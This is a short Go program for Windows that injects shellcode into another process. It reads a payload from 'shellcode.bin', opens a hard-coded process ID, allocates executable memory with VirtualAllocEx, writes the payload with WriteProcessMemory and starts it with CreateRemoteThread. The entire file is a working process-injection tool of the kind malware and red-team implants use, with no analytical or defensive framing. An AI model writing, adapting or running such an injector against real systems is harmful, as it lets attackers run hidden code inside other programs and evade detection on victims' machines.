package main

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

var kernel32 = windows.NewLazySystemDLL("kernel32.dll")

var (
	virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	closeHandle         = kernel32.NewProc("CloseHandle")
)

func inject(pid int, shellcode []byte) (string, error) {
	fmt.Println("[*] Injecting into PID:", pid)
	process_handle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(pid))
	if err != nil {
		return "", err
	}
	fmt.Println("[*] Opening handle to process...", process_handle)
	defer windows.CloseHandle(process_handle)

	fmt.Println("[*] Handle: ", process_handle)

	addr, _, err := virtualAllocEx.Call(uintptr(process_handle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "", err
	}

	fmt.Println("[*] VirtualAllocEx: ", addr)

	fmt.Println("[*] Allocating memory in remote process...", addr)

	a, _, err := writeProcessMemory.Call(uintptr(process_handle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if a == 0 {
		return "", err
	}

	thread_handle, _, err := createRemoteThread.Call(uintptr(process_handle), 0,  0, addr, 0, 0, 0)
	fmt.Println("[*] Creating remote thread: ", thread_handle)
	if thread_handle == 0 {
		fmt.Println("[*] Error:", err)
		return "", err
	}

	closeHandle.Call(uintptr(thread_handle))
	closeHandle.Call(uintptr(process_handle))

	return "OK", nil
}

func main() {
	shellcode, err := os.ReadFile("shellcode.bin")
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("[*] Shellcode Length:", len(shellcode))

	_, err = inject(7580, shellcode)
	if err != nil {
		fmt.Println(err)
	}
}
